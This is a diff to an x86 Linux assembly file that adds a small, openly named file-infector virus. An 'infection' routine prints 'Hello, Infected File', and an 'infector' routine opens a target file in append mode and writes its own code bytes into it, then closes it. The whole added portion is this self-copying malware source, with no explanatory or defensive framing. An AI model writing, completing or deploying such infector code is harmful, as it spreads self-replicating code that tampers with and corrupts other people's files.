@@ -38,3 +38,46 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+section .data
+msg db "Hello, Infected File", 10
+msg_len equ $ - msg
+
+section .text
+global infection
+global infector
+
+code_start:
+infection:
+    push ebp
+    mov ebp, esp
+    push ebx
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, msg
+    mov edx, msg_len
+    int 0x80
+    pop ebx
+    pop ebp
+    ret
+
+infector:
+    push ebp
+    mov ebp, esp
+    push ebx
+    mov eax, 5
+    mov ebx, [ebp+8]
+    mov ecx, 1025
+    mov edx, 0644
+    int 0x80
+    mov ebx, eax
+    mov eax, 4
+    mov ecx, code_start
+    mov edx, code_end - code_start
+    int 0x80
+    mov eax, 6
+    int 0x80
+    pop ebx
+    pop ebp
+    ret
+code_end:
